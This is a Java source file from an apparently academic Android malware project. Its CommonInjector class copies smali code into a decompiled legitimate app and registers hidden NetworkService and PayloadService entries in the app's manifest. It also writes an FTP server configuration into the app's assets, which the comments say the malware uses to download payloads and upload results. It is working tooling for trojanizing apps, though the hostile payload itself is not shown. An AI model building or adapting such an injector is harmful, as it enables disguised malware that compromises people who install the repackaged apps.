/*
 * Copyright 2015 
 * 	Danilo Cianciulli 			<cianciullidanilo@gmail.com>
 * 	Emranno Francesco Sannini 	<esannini@gmail.com>
 * 	Roberto Falzarano 			<robertofalzarano@gmail.com>
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 * 
 *  http://www.apache.org/licenses/LICENSE-2.0
 * 
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package it.unisannio.srss.dame.injection;

import it.unisannio.srss.dame.android.services.NetworkService;
import it.unisannio.srss.dame.android.services.PayloadService;
import it.unisannio.srss.dame.model.FTPServerConfig;
import it.unisannio.srss.utils.DirectoryCopier;
import it.unisannio.srss.utils.FileUtils;
import it.unisannio.srss.utils.ManifestManipulator;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.nio.file.Path;
import java.nio.file.Paths;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

public class CommonInjector {

	private final static Logger LOG = LoggerFactory
			.getLogger(CommonInjector.class);

	public static final String manifestName = "AndroidManifest.xml";

	final static String CONFIG_FILE = "ftp_config_srss.properties";


	/**
	 * Copia il contenuto di una directory in un'altra directory
	 * 
	 * @param commonSmaliSource
	 *            la directory che contiene lo smali da copiare
	 * @param appSmaliPath
	 *            la directory in cui si vuole copiare lo smali
	 * @throws IOException 
	 */
	public static void injectSmali(Path commonSmaliSource, Path appSmaliPath)
			throws IOException {
		FileUtils.checkDir(commonSmaliSource.toFile());
		FileUtils.checkDirForWriting(appSmaliPath.toFile(),false);
		LOG.info("Start copying common smali from "
				+ commonSmaliSource.toString() + " to "
				+ appSmaliPath.toString());
		try {
			DirectoryCopier.copy(commonSmaliSource, appSmaliPath);
		} catch (IOException e) {
			LOG.error("Error while copying.", e);
		}
		LOG.info("End copying common smali code");
	}

	/**
	 * Inietta nel manifesto una serie di servizi
	 * 
	 * @param appSmaliPath
	 * @return <code>true</code> se l'operazione è andata a buon fine,
	 *         <code>false</code> altrimenti.
	 * @throws FileNotFoundException
	 *             se il path che viene indicato e' errato
	 */
	public static boolean injectServices(Path appSmaliPath)
			throws FileNotFoundException {
		LOG.info("Start adding service to manifest");
		File manifest = FileUtils.checkFile(new File(appSmaliPath.toFile(),
				manifestName));
		ManifestManipulator manifestManipulator = new ManifestManipulator(
				manifest);
		manifestManipulator.addServices(
				NetworkService.class.getCanonicalName(),
				PayloadService.class.getCanonicalName());
		boolean ret = manifestManipulator.writeOutputManifest();
		LOG.info("End adding service to manifest");

		return ret;
	}

	/**
	 * Inietta la configurazione per la connessione al server ftp nella parte
	 * android del progetto del malware
	 * 
	 * @param appSmaliPath
	 *            il root path in cui e' l'app trusted decompilata
	 * @param ftpURL
	 *            l'url del server ftp
	 * @param username
	 *            lo username per la connessione al server
	 * @param password
	 *            la password per la connessione al server
	 * @param payloadsURI
	 *            l'URI al quale è possibile scaricare i payloads
	 * @param resultURI
	 *            l'URI al quale è possibile caricare i risultati
	 *            dell'esecuzione del malware
	 * @throws IOException
	 */
	public static void injectFtpConfig(Path appSmaliPath, FTPServerConfig serverConfig) throws IOException {
		LOG.info("Generating FTP server configuration.");
		Path config = Paths.get(appSmaliPath.toString(), "assets", CONFIG_FILE);
		
		serverConfig.writeToFile(config.toFile());
		LOG.info("FTP configuration generated");

	}
}
